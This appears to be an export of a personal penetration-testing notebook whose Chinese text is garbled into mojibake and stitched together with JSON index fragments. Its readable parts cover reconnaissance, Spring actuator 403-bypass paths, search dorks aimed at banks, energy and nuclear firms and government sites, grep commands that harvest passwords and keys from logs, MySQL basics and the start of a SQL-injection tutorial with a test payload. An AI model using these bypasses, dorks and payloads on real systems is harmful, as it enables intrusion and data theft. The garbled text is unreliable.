å½“ç›®å½•å­˜åœ¨æ—¶ä¼šè‡ªåŠ¨åœ¨ç›®å½•ååŠ ä¸Š/ï¼Œå¦‚è®¿é—®/adminåurlä¼šè‡ªåŠ¨åœ¨å…¶åå¢åŠ /ï¼Œå³å˜ä¸º/admin/ é€çº§Fuzz Nginxåä»£é—®é¢˜ï¼ˆä¸€ä¸ªç›®å½•å¯¹åº”ä¸€ä¸ªwebæœåŠ¡ï¼‰ å…³äºæ–‡ä»¶ å¤‡ä»½æ–‡ä»¶æ‰«æ ä¸­é—´ä»¶ï¼Œæ¡†æ¶ï¼Œåç«¯è¯­è¨€å¯¹åº”æ‰«æ webshellæ‰«æ TIPSï¼š a.phpæ–‡ä»¶å­˜åœ¨ï¼Œé’ˆå¯¹æ–‡ä»¶åè¿›è¡Œfuzzæ‰«æ å¤šä¸ªåŸŸåè¿›è¡Œå¤‡ä»½æ–‡ä»¶æ‰«æ åŸŸåçš„ä¸€éƒ¨åˆ†ï¼Œå…¬å¸åç§°çš„ç¼©å†™ï¼Œç›®å½•åï¼ˆç›®å½•ä¸º/cnï¼Œå¤‡ä»½æ–‡ä»¶ä¸º/cn/cn.rarï¼‰ ç›®å½•å¯èƒ½ä¸ºåŸŸåçš„ä¸€éƒ¨åˆ†ï¼Œå…¬å¸çš„ç¼©å†™ï¼Œç³»ç»Ÿåç§°çš„ç¼©å†™ç­‰ 403bypass Springï¼ŒShiroæƒé™ç»•è¿‡ 0x727/BypassPro: å¯¹æƒé™ç»•è¿‡è‡ªåŠ¨åŒ–bypassçš„burpsuiteæ’ä»¶ (github.com) 403 /actuator/heapdump 200 /actuator/heapdump;.js 403 /actuator/httptrace 200 /actuator/httptrace/# (burpæŠ“åŒ…æ”¹) è¿˜æœ‰å…¶ä»–ç‰¹æ®Šæƒ…å†µ 404 /sys/actuator 200 /sys/..;/actuator 200 /sys/;/actuator å¾ˆå¤šæ—¶å€™è®¿é—®actuatorï¼Œä¸ä¼šæ˜¾ç¤ºç«¯ç‚¹ï¼Œä½†æ˜¯è®¿é—®å…·ä½“çš„ç«¯ç‚¹æ˜¯å¯ä»¥è®¿é—®åˆ°çš„ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥è®¿é—®mappingsç«¯ç‚¹æ¥æŸ¥çœ‹å­˜åœ¨å“ªäº›ç«¯ç‚¹ burpfakeIP â€‹ JSä¸­çš„ä¿¡æ¯ å¯èƒ½æ³„éœ²æ¥å£ï¼Œåå°åœ°å€ï¼Œå¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ æµè§ˆå™¨æ’ä»¶è¢«åŠ¨æ”¶é›† Burpè¢«åŠ¨æ”¶é›† æŠ¥é”™ä¿¡æ¯ æŠ¥é”™ä¿¡æ¯ä¸­é€šå¸¸æœ‰webæœåŠ¡å™¨çš„å„ç§ä¿¡æ¯ï¼Œå¦‚ç‰©ç†è·¯å¾„ï¼Œç»„ä»¶ä¿¡æ¯ï¼Œä¸»æœºç³»ç»Ÿç­‰ ç›¸å…³å…³é”®è¯/è¯­æ³• å…³é”®è¯ # ä¼ä¸šæ•æ„Ÿä¿¡æ¯ æ‰‹æœºå· | åˆåŒ | åå• | å£ä»¤ | éšç§æ•°æ® | å†…éƒ¨ | è´¦å· | é€šè®¯å½• | èŠ±åå†Œ | æŠ¥è¡¨ | æŠ•æ ‡æ–‡ä»¶ | å…¥èŒ | è®¾è®¡å›¾çº¸ | ç®€å† | æ‹›æ ‡ | å¯†ç  | é»˜è®¤ # åå° ç®¡ç†|åå°|ç™»é™†|å¹³å°|ç³»ç»Ÿ login|admin|manage|manager|admin_login|system # EDU https://blog.csdn.net/qq_29437513/article/details/124328269 å…³é”®è¯:é“¶è¡Œå¡|å½•å–|ç”³è¯·|é€€ä¼|å®¿èˆ|å›¾ä¹¦ï¼Œå­¦ç”Ÿï¼Œæ•™å¸ˆï¼Œè¡¥åŠ©ï¼Œå…è¯•ï¼Œç ´æ ¼ï¼Œå›¢å‘˜ï¼Œå…¥å…šï¼Œç§¯æåˆ†å­ # jså¯»æ‰¾æ¥å£ path: url: get( post( # æ¥å£ get list upload download exec search encrypt decrypt token Googleè¯­æ³• Googleè¯­æ³•ä¹‹ä¿¡æ¯æ”¶é›†ä¹‹é“ (yuque.com) å¸¸ç”¨è¯­æ³• # é€»è¾‘è¿ç®—ç¬¦ OR AND # åŸŸå site:xxx.com # ipæ®µ site:1.1.1.* # åŒå¼•å·åŒ…å›´å¿…é¡»å‡ºç°xxx \"xxx\" # æœç´¢ç½‘ç«™æ­£æ–‡å†…å®¹ intext \"ç‰ˆæƒæ‰€æœ‰ï¼šèä¹¡å¸‚è‡ªç„¶èµ„æºå’Œè§„åˆ’å±€\" intext:\"èµ£ICPå¤‡15000724å·\" # æœç´¢ç¼“å­˜å†…å®¹ cache: # æœç´¢url inurl: upload download ?id= ?path= .php .asp .aspx .jsp # è¿‡æ»¤å†…å®¹ -xxx ç©ºé—´æœç´¢å¼•æ“ title=\"Directory listing for /\" title=\"index of/\" title=\"phpinfo\" tile=\"outlook\" / \"tomcat\" / \"weblogic\" # æŸ¥æ‰¾ç‰¹å®šåº”ç”¨ (title=\"å¹³å°\"||title=\"ç®¡ç†\"||title=\"ç³»ç»Ÿ\"||title=\"åå°\"||title=\"ç™»å½•\") server=\"WebSockify Python\" && title=\"Directory listing for /\" # æŸ¥æ‰¾novncï¼ˆnovncè¿è¡Œåœ¨å®¹å™¨é‡Œï¼‰ header=xxx # è¯·æ±‚å¤´ æ„Ÿè§‰hunterçš„å¤š Hunter (icp.name=\"é“¶è¡Œ\"||icp.name=\"ä¿¡ç”¨åˆä½œè”ç¤¾\"||icp.name=\"ä¿¡ç”¨ç¤¾è”åˆç¤¾\") (icp.name=\"ä¿¡æ‰˜æœ‰é™\"||icp.name=\"è´¢åŠ¡æœ‰é™\"||icp.name=\"ç†è´¢æœ‰é™\") (icp.name=\"å¤©ç„¶æ°”é›†å›¢\"||icp.name=\"æ ¸å·¥ä¸šé›†å›¢\"||icp.name=\"å›½å®¶ç”µç½‘\"||icp.name=\"çŸ³æ²¹åŒ–å·¥\"||icp.name=\"èƒ½æºé›†å›¢\") app.name==\"Vue.js\"&&(icp.name=\"é“¶è¡Œ\")&&(title=\"å¹³å°\"||title=\"ç®¡ç†\"||title=\"ç³»ç»Ÿ\"||title=\"åå°\"||title=\"ç™»å½•\") city=\"æ–°ä½™\"&&(title=\"æ™ºæ…§\"||title=\"æ”¿åºœ\"||title=\"å¤§æ•°æ®\"||title=\"æ™ºèƒ½\") icp.industry=\"è´§å¸é‡‘èæœåŠ¡\" ip.province=\"æ±Ÿè‹\" æœç´¢IPå¯¹åº”ä¸»æœºåœ¨æ±Ÿè‹çœçš„èµ„äº§ ip.country=\"CN\" ä¸­å›½èµ„äº§ï¼ˆç©ºé—´æœç´¢å¼•æ“æœåˆ°çš„å›½å¤–çš„éƒ½æ˜¯bcï¼Œç‹ ç‹ åœ°æ±¡æŸ“ï¼‰ Fofa https://fofa.info/library Fofaç½‘ç»œæµ‹ç»˜å‘½ä»¤æ±‡æ€» cert=è‹±æ–‡ç¼©å†™ # è¯ä¹¦å†…å®¹ cert.subject=è‹±æ–‡ç¼©å†™ # è¯ä¹¦æŒæœ‰è€… cert.issuer=è‹±æ–‡ç¼©å†™ # è¯ä¹¦é¢å‘è€… org=\"China Education and Research Network Center\" #æ•™è‚²ç½‘æ®µ é›¶é›¶ä¿¡å®‰ Linuxå‘½ä»¤ Winodwsä¸‹å¯ä»¥è£…ä¸ªwls2 å°´å°¬ç‚¹ğŸ˜… wsl2éœ€è¦å¼€å¯hyper-Vï¼Œä½†æ˜¯å®‰å“æ¨¡æ‹Ÿå™¨åˆè¦å…³é—­hyper-vï¼Œè€Œä¸”VM15.5ä»¥ä¸‹çš„ç‰ˆæœ¬ä¹Ÿéœ€è¦å…³é—­hyper-Vã€‚ è™šæ‹ŸåŒ–æŠ€æœ¯ï¼šhttps://yanglei253.github.io/2021/01/05/docker/docker1-virtualization/ # å…³é—­hyper-Våé‡æ–°å¼€å¯wsl # å¼€å¯hyper-V dism.exe /Online /Enable-Feature /All /FeatureName:Microsoft-Hyper-V # å¼€å¯wslæ”¯æŒ Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux å›¾æ ‡å“ˆå¸ŒæŒ‡çº¹æå– curl https://hunter.qianxin.com/favicon.ico | md5sum # hunter web.icon=\"md5\" # 360 favicon:\"MD5\" æ•æ„Ÿä¿¡æ¯æŸ¥æ‰¾ æ•´åˆæˆshè„šæœ¬ï¼Œä¸€é”®æå– æå–Nginxæ—¥å¿—æ–‡ä»¶ä¸­çš„200 grep -EHirn \"HTTP/1.1\\\" 200\" wxtest.zyxt.com.cn | cut -d ':' -f 2- > 200.txt æå–ipå’Œurl grep -E \"([0-9]{1,3}[\\.]){3}[0-9]{1,3}\" -r 1--color=auto æå–IP grep -E \"https?://[a-zA-Z0-9\\.\\/_&=@$%?~#-]*\" -r 1 --color=auto æå–åŸŸå grep -EHirn \"http://|https://\" 200.txt | cut -d ':' -f 2- > url.txt æå–è´¦å¯† grep -EHirn \"username|password|å¯†ç |credentials|passwd|pass|testuser|user|pwd|dbuser|token|jdbc|admin|login|sa|root\" 200.txt | cut -d ':' -f 2- > pass.txt æå–å„ç§key grep -EHirn \"ak|å¯†é’¥|accesskey|apikey|key|secret|corpid|corpsecret|cloud|oss\" 200.txt | cut -d ':' -f 2- > key.txt æå–æ–‡ä»¶ä¸‹è½½ grep -EHirn \"\\?file|download|attachment\" | cut -d ':' -f 2- > FileDownload.txt æå–ä¸ªäººæ•æ„Ÿä¿¡æ¯ grep -EHirn \"phone|mobile|card|real_name|\\.png|\\.jpg|\\.mp4\" | cut -d ':' -f 2- > LeakInfo.txt æ–‡ä»¶ä¸‹è½½ # ç›®å½•éå†æ¼æ´ï¼Œç›®å½•åé»˜è®¤ä¸ºhost wget -r --no-pare url /mnt/c/Users/khaz/Downloads # æ‰¹é‡ä¸‹è½½,æ¯”å¦‚å­˜å‚¨æ¡¶éå† wget -i urls.txt -P Download/ æ–‡æœ¬ç±» cat file1.txt file2.txt fileN.txt > out.txt # æ–‡æœ¬åˆå¹¶ sort 1pass.txt | uniq > 1pass.txt.tmp && mv 1pass.txt.tmp 1pass.txt # æ’åº+å»é‡ javawebæŸ¥æ‰¾æ•°æ®åº“é…ç½®æ–‡ä»¶ find è·¯å¾„ -type f |xargs grep \"com.mysql.jdbc.Driver\" Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-29 19:10:41 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/01.Sqlæ³¨å…¥/Mysql/Webå®‰å…¨ä¹‹MysqlåŸºç¡€.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/01.Sqlæ³¨å…¥/Mysql/Webå®‰å…¨ä¹‹MysqlåŸºç¡€.html","title":"MysqlåŸºç¡€æ“ä½œ","keywords":"","body":"Mysqlç™»å½• å‘½ä»¤è¡Œå‚æ•° -u username æŒ‡å®šæ•°æ®åº“ç”¨æˆ·å -p password æŒ‡å®šæ•°æ®åº“å¯†ç  -e æŒ‡å®šè¦è¿è¡Œçš„sqlè¯­å¥ -D æŒ‡å®šæ•°æ®åº“å -P ç«¯å£ ç™»å½• mysql -uroot -proot [-P3306 -h127.0.0.1] ä¿®æ”¹å¯†ç  set password for root@localhost = password('xxx'); å¼€å¯è¿œç¨‹è¿æ¥ # ä¿®æ”¹é…ç½®æ–‡ä»¶ bind-address = 0.0.0.0 # ä¸ºéœ€è¦è¿œç¨‹ç™»å½•çš„ç”¨æˆ·èµ‹äºˆæƒé™ grant all privileges on *.* to 'root'@'%' identified by '123' with grant option; flush privileges; æ³¨ï¼šipå¤„å¡«%çš„è¯åˆ™è¡¨ç¤ºæ‰€æœ‰ipéƒ½å¯ä»¥è®¿é—® # æŸ¥çœ‹ç”¨æˆ·ä¸ä¸»æœºå…³ç³» use mysql; select user,host from user; mysql8 https://blog.csdn.net/llf_cloud/article/details/83141338 é€€å‡º exit; quit; \\q; åŸºç¡€çŸ¥è¯† æ¡ä»¶æŸ¥è¯¢ where id xxx xxxï¼š è¿ç®—ç¬¦ è§£é‡Š = ç­‰äº <> ï¼Œ!= ä¸ç­‰äº å°äºï¼Œå°äºç­‰äº >ï¼Œ>= å¤§äº,å¤§äºç­‰äº in()ï¼Œnot in() æ˜¯å¦åœ¨æ•°ç»„ä¸­ and , && é€»è¾‘ä¸ or , \\ \\ é€»è¾‘æˆ– like '%xx%' æ¨¡ç³ŠæŸ¥è¯¢ is null , is not null æ˜¯å¦ä¸ºç©º regexp æ­£åˆ™åŒ¹é… is between x and y åœ¨xå’Œyä¹‹é—´ å¸¸ç”¨è¡¨ æ³¨æ„sys åº“æ˜¯åœ¨MySQL5.6åŠä»¥ä¸Šç‰ˆæœ¬æ‰æœ‰çš„ è®°å½•æ‰€æœ‰æ•°æ®åº“åŠè¡¨ information_schema.tables sys.schema_table_statistics_with_buffer sys.x$schema_table_statistics_with_buffer å­—æ®µï¼štable_schemaï¼šæ•°æ®åº“åç§° table_nameï¼šæ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨ mysql.innodb_table_stats mysql.innodb_index_stats å­—æ®µï¼šdatabase_nameï¼šæ•°æ®åº“åç§° table_nameï¼šæ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨ è®°å½•æ‰€æœ‰æ•°æ®åº“ information_schema.schemata å­—æ®µï¼šSCHEMA_NAMEï¼šæ•°æ®åº“å è®°å½•å«æœ‰è‡ªå¢idå­—æ®µçš„æ•°æ®åº“åŠè¡¨ sys.schema_auto_increment_columns å­—æ®µï¼štable_schemaï¼šæ•°æ®åº“åç§° table_nameï¼šæ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨ è®°å½•æ‰€æœ‰å­—æ®µ information_schema.columns å­—æ®µï¼štable_nameï¼šè¡¨å column_nameï¼šè¡¨ä¸‹çš„æ‰€æœ‰å­—æ®µå é…ç½®ä¿¡æ¯ @@character set_ databaseï¼šå­—ç¬¦é›† @@hostnameï¼šè®¡ç®—æœºå @@version_compile_osï¼šç³»ç»Ÿç‰ˆæœ¬ @@basedir:mysqlè·¯å¾„ @@datadir:myslq dataå­˜æ”¾è·¯å¾„ @@sql_modeï¼šsqlæ¨¡å¼ @æ˜¯ç”¨æˆ·å˜é‡ï¼Œ@@æ˜¯ç³»ç»Ÿå˜é‡ å¸¸ç”¨å‡½æ•° select user(); æŸ¥çœ‹å½“å‰MySQLç™»å½•çš„ç”¨æˆ·å select database(); æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„æ•°æ®åº“å select version(); æŸ¥çœ‹å½“å‰MySQLç‰ˆæœ¬ # æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™ SELECT * FROM mysql.user WHERE user = CURRENT_USER(); SHOW GRANTS FOR CURRENT_USER(); group_concat(å­—æ®µå) æŸ¥çœ‹æ‰€æœ‰å­—æ®µåï¼Œé»˜è®¤åˆ†éš”ç¬¦ä¸º, length() è·å¾—é•¿åº¦ concat(str1,str2) è¿æ¥str1å’Œstr mid(str,a,length) ä»aå¼€å§‹æˆªå–strå­—ç¬¦lengthé•¿åº¦ substr(str,a,length) ä»aå¼€å§‹æˆªå–strå­—ç¬¦lengthé•¿åº¦ left/right(str,length) è¿”å›æœ€å·¦è¾¹/æœ€å³è¾¹çš„lengthé•¿åº¦å­—ç¬¦ ord(string) è¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç å€¼ ascii(str) è¿”å›å­—ç¬¦çš„asciiç  rand()éšæœºæ•° å¸¸ç”¨æ“ä½œè¯­å¥ åˆ›å»ºè¡¨ CREATE TABLE IF NOT EXISTS `users`( `id` INT UNSIGNED AUTO_INCREMENT, `username` VARCHAR(10) NOT NULL, `passwd` VARCHAR(40) NOT NULL, PRIMARY KEY ( `id` ) )ENGINE=InnoDB DEFAULT CHARSET=utf8; AUTO_INCREMENTï¼šè‡ªå¢ PRIMARY KEYï¼šä¸»é”® å¯¹æ•°æ®åº“çš„å¢åˆ æ”¹æŸ¥ å¢ create database æ•°æ®åº“å åˆ  drop database æ•°æ®åº“å æŸ¥ æ‰€æœ‰æ•°æ®åº“ show databases æ”¹ rename database æ—§å to æ–°å å¯¹æ•°æ®è¡¨çš„å¢åˆ æ”¹æŸ¥ å¢ create table æ•°æ®è¡¨å(id int,name char(10)) å‚æ•°å½¢å¼ï¼šå­—æ®µå å­—æ®µç±»å‹ åˆ  drop table æ•°æ®è¡¨å æŸ¥ show tables æ”¹ alter table æ—§å to rename æ–°å å¯¹è¡¨æ•°æ®çš„å¢åˆ æŸ¥æ”¹ å¢ insert into è¡¨å(åˆ—1ï¼Œåˆ—2 ... ) values(å€¼1ï¼Œå€¼2 ... ) åˆ  delete from è¡¨å where åˆ—å = å€¼ æŸ¥ æ‰€æœ‰å†…å®¹ select * from è¡¨å æŸ¥çœ‹è¡¨çš„ç»“æ„ DESC è¡¨å / show columns from è¡¨å æ¡ä»¶ä¸‹æ‰€æœ‰åˆ— select * from è¡¨å where æ¡ä»¶ æ¡ä»¶ä¸‹éƒ¨åˆ†åˆ— select åˆ—1,åˆ—2,...,åˆ—n from è¡¨å where æ¡ä»¶; æ”¹ ä¿®æ”¹æ•°æ® update è¡¨å set åˆ—å=æ–°å€¼ where æ¡ä»¶ REPLACE INTO table_name VALUES(ä¸»é”®,value..) ä¿®æ”¹åˆ—å alter table è¡¨å change æ—§åˆ—å æ–°åˆ—å varchar(é•¿åº¦) replace intoï¼Œéœ€è¦æ›´æ”¹ä¸€æ•´æ¡æ•°æ®ï¼Œä¸èƒ½åªæ›´æ”¹å…¶ä¸­æŸåˆ—ã€‚ å¦‚æœå¾…å†™å…¥æ•°æ®å·²ç»å­˜åœ¨ï¼Œåˆ™å…ˆåˆ é™¤è¯¥è¡Œæ•°æ®ï¼Œç„¶åæ’å…¥æ–°çš„æ•°æ®ã€‚ å¦‚æœå¾…å†™å…¥æ•°æ®ä¸å­˜åœ¨ï¼Œåˆ™ç›´æ¥æ’å…¥æ–°æ•°æ®ã€‚ mysql> select * from users; +----+----------+--------+ | id | username | passwd | +----+----------+--------+ | 1 | khaz | 123 | | 2 | khaz2 | 1234 | +----+----------+--------+ 2 rows in set (0.00 sec) mysql> replace into users values(1,'passwd'); ERROR 1364 (HY000): Field 'username' doesn't have a default value mysql> replace into users values(1,'khaz3','passwd'); Query OK, 2 rows affected (0.00 sec) mysql> select * from users; +----+----------+--------+ | id | username | passwd | +----+----------+--------+ | 1 | khaz3 | passwd | | 2 | khaz2 | 1234 | +----+----------+--------+ 2 rows in set (0.00 sec) å¯¹ç”¨æˆ·çš„å¢åˆ æŸ¥æ”¹ å¢ insert into users(username,password) values('khaz','wuhu') create user 'ç”¨æˆ·å'@'æ¥æºåœ°å€' identified by 'å¯†ç ' åˆ  drop user ç”¨æˆ·å æŸ¥ select user() æ”¹ ä¿®æ”¹ç”¨æˆ·å rename user æ—§ç”¨æˆ·å to æ–°ç”¨æˆ·å ä¿®æ”¹å¯†ç  SET PASSWORD FOR ç”¨æˆ·å = PASSWORD('abc123'); sqlæ³¨å…¥ç›¸å…³è§£é‡Š order by order byè¯­å¥ç”¨äºæ ¹æ®æŒ‡å®šçš„åˆ—å¯¹ç»“æœé›†è¿›è¡Œæ’åºï¼Œæ”¯æŒå­—æ®µåå’Œå­—æ®µä½ç½® å¯é€‰å‚æ•°(æ’åˆ—æ–¹å¼): å‡åº(ASC) é»˜è®¤ é™åº(DESC) åœ¨sqlæ³¨å…¥ä¸­çš„ä½¿ç”¨ï¼š åˆ¤æ–­å­—æ®µæ•°ï¼šå½“å­—æ®µä½ç½®ä¸å­˜åœ¨æ—¶å°±ä¼šæŠ¥é”™ order byæ³¨å…¥ limit ç”¨äºåˆ†é¡µ select* from article LIMIT 1,3 select * from article LIMIT 3 OFFSET 1 ä¸Šé¢ä¸¤ç§å†™æ³•éƒ½è¡¨ç¤ºå– 2ã€3ã€4 ä¸‰æ¡æ¡æ•°æ®ï¼š 1.å½“ LIMIT åé¢è·Ÿä¸¤ä¸ªå‚æ•°çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªæ•°è¡¨ç¤ºè¦è·³è¿‡çš„æ•°é‡ï¼Œåä¸€ä½è¡¨ç¤ºè¦å–çš„æ•°é‡ 2.å½“ LIMIT å’Œ OFFSET ç»„åˆä½¿ç”¨çš„æ—¶å€™ï¼ŒLIMIT åé¢åªèƒ½æœ‰ä¸€ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºè¦å–çš„çš„æ•°é‡ï¼ŒOFFSETè¡¨ç¤ºè¦è·³è¿‡çš„æ•°é‡ ã€‚ select* from article LIMIT 3 è¡¨ç¤ºå–å‰ä¸‰æ¡æ•°æ® å½“ LIMIT åé¢è·Ÿä¸€ä¸ªå‚æ•°çš„æ—¶å€™ï¼Œè¯¥å‚æ•°è¡¨ç¤ºè¦å–çš„æ•°æ®çš„æ•°é‡ã€‚ åœ¨æ³¨å…¥ä¸­çš„ä½¿ç”¨ï¼š ä½¿ç”¨group_concat()æ‰¹é‡æŸ¥è¯¢è¾“å‡ºç»“æœé•¿åº¦æœ‰é™åˆ¶ï¼Œéœ€è¦ä½¿ç”¨linmitä¸€æ¡ä¸€æ¡è·å–æˆ–ä½¿ç”¨concat()æ‹¼æ¥å¾—åˆ°ç»“æœ limit 0,1 limit 1,1 limit 2,1 .... union selectä¸select union selectè¯­å¥ç”¨æ¥åˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ª SELECT è¯­å¥çš„ç»“æœé›†ã€‚æ‰€ä»¥union selectå¯ä»¥ç”¨æ¥æŸ¥è¯¢å…¶ä»–è¡¨ã€‚ select å­—æ®µå€¼1 from è¡¨1 union select å­—æ®µå€¼2 from è¡¨2 unionç‰¹æ€§ 1.union selectåªèƒ½æŸ¥è¯¢ä¸¤ä¸ªè¡¨ä¸­å…±åŒéƒ½æœ‰çš„å­—æ®µï¼Œå¦‚æœä¸€ä¸ªå­—æ®µåœ¨å¦å¤–ä¸€ä¸ªè¡¨ä¸­æ²¡æœ‰ï¼Œå°±ä¼šæŠ¥é”™ å¦‚usersè¡¨æ¯”users2è¡¨å¤šäº†schoolå­—æ®µï¼ŒæŸ¥è¯¢usersè¡¨ä¸­çš„schoolå’Œusers2è¡¨ä¸­çš„addressï¼Œå› ä¸ºusers2è¡¨ä¸­æ²¡æœ‰schoolå­—æ®µï¼Œæ‰€ä»¥æŠ¥é”™ 2.(union) select æŸ¥è¯¢çš„å­—æ®µæ•°è¦ä¸€è‡´ï¼Œå¦åˆ™ä¼šæŠ¥é”™ æ‰€ä»¥éœ€è¦å…ˆç”¨order byæ¥åˆ¤æ–­å­—æ®µæ•° 3.union è‡ªå¸¦å»é‡åŠŸèƒ½ï¼ˆdistinctçš„åŠŸèƒ½ï¼‰ å¦‚æœä¸æƒ³è¦å»é‡å¯ä»¥ä½¿ç”¨union all select 1,2,3 selectæ—¶ä¸å†™åé¢çš„è¡¨åï¼Œè¿™æ—¶selectå®é™…ä¸Šæ²¡æœ‰å‘ä»»ä½•ä¸€ä¸ªæ•°æ®åº“æŸ¥è¯¢æ•°æ®ï¼Œå³æŸ¥è¯¢å‘½ä»¤ä¸æŒ‡å‘ä»»ä½•æ•°æ®åº“çš„è¡¨ã€‚è¿”å›å€¼å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„è¿™ä¸ªæ•°ç»„ã€‚ é€šè¿‡è¿™ä¸ªå’Œunion select æ„é€ ä¸´æ—¶æ•°æ® usersè¡¨ä¸­å¹¶æ²¡æœ‰è¦æŸ¥è¯¢çš„æ•°æ®,ä½†æ˜¯å´è¿”å›äº†æˆ‘ä»¬æ„é€ çš„æ•°æ®! è€Œåœ¨ä¸‹ä¸€æ¬¡æŸ¥è¯¢ä¸­ï¼Œè¿™ä¸ªæˆ‘ä»¬è‡ªå®šä¹‰çš„æ•°æ®ä¸å­˜åœ¨ï¼Œè¯´æ˜é€šè¿‡è¿™æ ·æ–¹å¼åˆ›å»ºçš„æ•°æ®çš„å­˜æ´»å‘¨æœŸåªåœ¨å…¶æŸ¥è¯¢è¯­å¥æ‰§è¡Œæ—¶ æ‰€ä»¥é€šè¿‡ä¸Šè¿°æ“ä½œå°±å¯ä»¥ä¸´æ—¶æ„é€ ä¸€ä¸ªç”¨æˆ·ï¼Œè¾¾åˆ°ç™»å½•çš„æ•ˆæœ è”åˆæŸ¥è¯¢æ³¨å…¥ éœ€è¦å°†å‰é¢çš„selectè¯­å¥è®¾ç½®ä¸ºå‡ï¼Œæ‰èƒ½ä½¿ç”¨åé¢çš„union select 1,2,3æ¥åˆ¤æ–­å“ªä¸€ä¸ªå­—æ®µå€¼æ˜¯å›æ˜¾çš„ï¼Œæ˜¯å¯ä»¥åˆ©ç”¨çš„ã€‚ï¼ˆåŸå› æ˜¯ä¸€èˆ¬è·å–çš„æ˜¯ç¬¬ä¸€ä¸ªç»“æœï¼Œè€Œæˆ‘ä»¬æ„é€ çš„union select 1,2,3åœ¨ä¹‹åï¼‰ id=-1 union select 1,2,3 select+XXå’Œè¡¨å åˆ—æ•°å–å†³äºæˆ‘ä»¬è¾“å…¥çš„æ•°å­—ä¸ªæ•°ï¼Œè¡Œæ•°å–å†³äºè¡¨åŸæ¥çš„è¡Œæ•°ã€‚ æ³¨é‡Šç¬¦ å•è¡Œæ³¨é‡Šç¬¦ --+ å®è´¨ä¸Š--æ˜¯èµ·åˆ°æ³¨é‡Šçš„ä½œç”¨ï¼Œä½†æ˜¯åœ¨sqlä¸­ç”¨--æ³¨é‡Šåé¢å¿…é¡»åŠ ä¸€ä¸ªç©ºæ ¼--æ‰ç”Ÿæ•ˆ # åœ¨URLä¸­#è¡¨ç¤ºé”šç‚¹ï¼Œå¸¦ä¸Š#ä¸ä¼šè¯·æ±‚åç«¯è·¯ç”±ï¼Œè€Œæ˜¯åˆ·æ–°å‰ç«¯è·¯ç”±ï¼Œæ‰€ä»¥ æµ‹è¯•ä¸€èˆ¬ç”¨URLç¼–ç åçš„%23 å¤šè¡Œæ³¨é‡Šç¬¦ / / ``` ç”¨äºæ³¨é‡Šå¤šè¡Œ /* */ ``` and ä¸ or åå¼•å· åå¼•å·æ˜¯ mysql çš„è½¬ä¹‰ç¬¦ï¼Œåªè¦ä½ ä¸åœ¨åˆ—åã€è¡¨åä¸­ä½¿ç”¨ mysql çš„ä¿ç•™å­—æˆ–ä¸­æ–‡ï¼Œå°±ä¸éœ€è¦è½¬ä¹‰ã€‚ å…¶ä»–æ•°æ®åº“ä¹ŸåŒæ ·æœ‰ä¿ç•™å­—ï¼Œå¦‚æœä½¿ç”¨çš„è¯ä¹ŸåŒæ ·éœ€è¦è½¬ä¹‰ï¼Œåªæ˜¯è½¬ä¹‰ç¬¦ä¸åŒè€Œå·²ã€‚ #å‡å¦‚è¡¨Aä¸­æœ‰ä¸€åˆ—åä¸ºselectï¼ŒæŸ¥è¯¢è¯¥åˆ— select select from A; #é”™è¯¯ select `select` from A; #æ­£ç¡® #å‡å¦‚å­˜åœ¨è¡¨flagï¼Œç”¨desc(describe)æŸ¥è¯¢è¯¥è¡¨ä¿¡æ¯ desc flag A; #æ˜¾ç¤ºflagè¡¨ä¿¡æ¯ï¼Œåˆ«åä¸ºA desc `flag` `A` #ä¸ä¸Šè¿°è¯­å¥ç›¸åŒ MySQL å…³é”®å­—å’Œä¿ç•™å­—æ±‡æ€»ï¼ˆMySQL 8.0ï¼‰ï¼š https://blog.csdn.net/m0_56921622/article/details/122975904 as ASå‘½ä»¤ç”¨äºä½¿ç”¨åˆ«åé‡å‘½ååˆ—æˆ–è¡¨ã€‚ åˆ«åä»…åœ¨æŸ¥è¯¢æœŸé—´å­˜åœ¨ã€‚ é‡å‘½åè¡¨å select c.ID from users as c é‡å‘½ååˆ—å select c.ID as ID2 from users as c æ³¨ï¼šå¯ä»¥æŠŠasçœç•¥ï¼Œå³select c.ID from users cç­‰ä»·äºselect c.ID from users as c åœ¨sqlæ³¨å…¥å¯ä»¥ç”¨äºæ— åˆ—åæ³¨å…¥ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-21 18:49:47 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/01.Sqlæ³¨å…¥/Mysql/Webå®‰å…¨ä¹‹Mysqlæ³¨å…¥.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/01.Sqlæ³¨å…¥/Mysql/Webå®‰å…¨ä¹‹Mysqlæ³¨å…¥.html","title":"Sqlæ³¨å…¥è¯¦è§£--Mysql","keywords":"","body":"æ¼æ´ä»‹ç» Sqlæ³¨å…¥æ¼æ´æ˜¯æŒ‡æœåŠ¡å™¨åœ¨å¤„ç†Sqlè¯­å¥æ—¶é”™è¯¯åœ°æ‹¼æ¥ç”¨æˆ·æäº¤çš„å‚æ•°ï¼Œæ‰“ç ´äº†åŸæœ‰çš„Sqlæ‰§è¡Œé€»è¾‘ï¼Œå¯¼è‡´æ”»å‡»è€…å¯éƒ¨åˆ†æˆ–å®Œå…¨æŒæ¡Sqlè¯­å¥æ‰§è¡Œæ•ˆæœçš„ä¸€ç±»å®‰å…¨é—®é¢˜ã€‚ ç®€å•çš„ä¾‹å­ å‡è®¾åç«¯Sqlä»£ç  $sql=\"select * from users where id='$id';\" ç”¨æˆ·æäº¤ ?id=1' and 1=1 # 